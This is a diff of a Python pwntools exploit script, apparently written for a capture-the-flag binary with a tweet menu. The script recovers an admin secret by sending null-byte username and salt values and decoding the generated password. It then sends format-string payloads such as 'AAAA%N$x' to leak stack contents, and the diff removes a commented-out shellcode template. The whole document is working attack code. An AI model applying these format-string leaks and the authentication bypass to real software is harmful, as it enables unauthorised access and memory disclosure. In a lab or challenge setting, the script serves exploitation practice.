@@ -39,11 +39,30 @@ continue
 # RWX:      Has RWX segments
 
 context.terminal = ["xfce4-terminal", "-e"]
-username = "\x00" * 0x0f
-salt     = "\x00" * 0x0f
-
 libc =  ELF("/usr/lib32/libc.so.6")
 rop  =  ROP(libc)
+io = start()
+
+def crack_password():
+    username = "\x00" * 0x0f
+    salt     = "\x00" * 0x0f
+
+    io.recvuntil("Enter Username: \n")
+    io.send(username)
+    io.recvuntil("Enter Salt: \n")
+    io.sendline(salt)
+    io.recvuntil("Generated Password:\n")
+    password = io.recvline().lstrip().rstrip()
+
+    log.info("Got password: " + password)
+
+    secret = ''
+    for elem in [password[i:i+8] for i in range(0, len(password), 8)]:
+        secret += p32(int(elem, 16))
+    log.info("Recovered: " + secret)
+
+    return secret
+
 
 def do_tweet(msg):
     io.recvuntil("Enter Choice: ")
@@ -66,71 +85,27 @@ def get_admin(password):
         return False
     return True
 
-def leak_libc():
-    pass
+def leak_argN(n):
+    craft = "AAAA%{}$x".format(n)
+    do_tweet(craft)
+    io.recvuntil("AAAA")
 
-data = []
+    return io.recvline().rstrip()[:-9]
 
-for K in range(1, 600):
-    while True:
-        io = start()
-        io.recvuntil("Enter Username: \n")
-        io.send(username)
-        io.recvuntil("Enter Salt: \n")
-        io.sendline(salt)
-        io.recvuntil("Generated Password:\n")
-        password = io.recvline().lstrip().rstrip()
+def dump_stack(args):
+    data = []
+    for arg in args:
+        data.append(leak_argN(arg))
 
-        log.info("Got password: " + password)
+    for (i, dump) in enumerate(data):
+        print ("{} | {} ({})".format(i + 1, dump, p32(int(dump, 16))))
 
-        secret = ''
-        for elem in [password[i:i+8] for i in range(0, len(password), 8)]:
-            secret += p32(int(elem, 16))
-        log.info("Recovered: " + secret)
+secret = crack_password()
+if not get_admin(secret):
+    log.error("Failed to get admin")
+    exit(-1)
 
-        if not get_admin(secret):
-            io.close()
-            continue
+dump_stack(range(1, 20))
 
-        to_add = ["deadbeef", "deadbeef"]
-
-        do_tweet("AAAA%{}$x".format(K))
-        io.recvuntil("View Chainz")
-        io.recvuntil("AAAA")
-        r = io.recvline().rstrip().lstrip()
-        indx = r.index("\xcc")
-
-        to_add[0] = r[:indx]
-
-        try:
-            do_tweet("AAAA%{}$s".format(K))
-            io.recvuntil("View Chainz")
-            io.recvuntil("AAAA")
-            r = io.recvline().rstrip().lstrip()
-            indx = r.index("\xcc")
-
-            to_add[1] = r[:indx]
-        except:
-            to_add[1] = "invalid addr"
-
-        data.append(to_add)
-        io.close()
-        break
-
-for (i, dump) in enumerate(data):
-    addr = dump[0]
-    point = dump[1]
-    print ("{} | {} ({}) -> {}".format(i + 1, addr, p32(int(addr, 16)), point))
-
-exit()
-# shellcode = asm(shellcraft.sh())
-# payload = fit({
-#     32: 0xdeadbeef,
-#     'iaaa': [1, 2, 'Hello', 3]
-# }, length=128)
-# io.send(payload)
-# flag = io.recv(...)
-# log.success(flag)
-
-io.interactive()
+#io.interactive()
 
